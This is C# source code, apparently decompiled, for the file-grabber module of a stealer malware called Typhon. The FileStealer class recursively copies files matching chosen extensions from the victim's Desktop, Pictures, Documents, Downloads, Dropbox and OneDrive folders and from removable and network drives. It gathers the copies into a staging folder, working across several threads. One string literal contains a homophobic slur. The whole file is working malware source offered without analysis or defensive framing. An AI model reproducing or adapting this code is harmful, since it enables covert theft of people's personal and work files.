using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;

namespace Typhon.Modules.FileGrabber
{
	// Token: 0x0200002B RID: 43
	internal class FileStealer
	{
		// Token: 0x060000B6 RID: 182 RVA: 0x00007A40 File Offset: 0x00005C40
		private static void GrabFile(string path)
		{
			FileInfo fileInfo = new FileInfo(path);
			if (fileInfo.Length > (long)Convert.ToInt32(Config.GrabberSizeLimit))
			{
				return;
			}
			if ((Config.FileGrabberExtension.Split(new char[]
			{
				'#'
			}).Contains(fileInfo.Extension) ? "oi_faggot_having_a_good_field_day_arent_you" : null) == null)
			{
				return;
			}
			string text = Path.Combine(FileStealer.SavePath, Path.GetDirectoryName(path).Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path).Replace(":", "")));
			string destFileName = Path.Combine(text, fileInfo.Name);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			fileInfo.CopyTo(destFileName, true);
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x00007AF8 File Offset: 0x00005CF8
		private static void GrabDirectory(string path)
		{
			if (!Directory.Exists(path))
			{
				return;
			}
			string[] directories;
			string[] files;
			try
			{
				directories = Directory.GetDirectories(path);
				files = Directory.GetFiles(path);
			}
			catch (UnauthorizedAccessException)
			{
				return;
			}
			catch (AccessViolationException)
			{
				return;
			}
			string[] array = files;
			for (int i = 0; i < array.Length; i++)
			{
				FileStealer.GrabFile(array[i]);
			}
			foreach (string path2 in directories)
			{
				try
				{
					FileStealer.GrabDirectory(path2);
				}
				catch
				{
				}
			}
		}

		// Token: 0x060000B8 RID: 184 RVA: 0x00007B88 File Offset: 0x00005D88
		public static void BeginFG(string sSavePath)
		{
			try
			{
				FileStealer.SavePath = sSavePath;
				foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
				{
					if (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network || driveInfo.DriveType == DriveType.CDRom)
					{
						FileStealer.TargetDirs.Add(driveInfo.RootDirectory.FullName);
					}
				}
				if (!Directory.Exists(FileStealer.SavePath))
				{
					Directory.CreateDirectory(FileStealer.SavePath);
				}
				List<Thread> list = new List<Thread>();
				using (List<string>.Enumerator enumerator = FileStealer.TargetDirs.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						string dir = enumerator.Current;
						try
						{
							list.Add(new Thread(delegate()
							{
								FileStealer.GrabDirectory(dir);
							}));
						}
						catch
						{
						}
					}
				}
				foreach (Thread thread in list)
				{
					thread.Start();
				}
				foreach (Thread thread2 in list)
				{
					if (thread2.IsAlive)
					{
						thread2.Join();
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		// Token: 0x0400004A RID: 74
		private static string SavePath = "Grabber";

		// Token: 0x0400004B RID: 75
		private static List<string> TargetDirs = new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
		};
	}
}
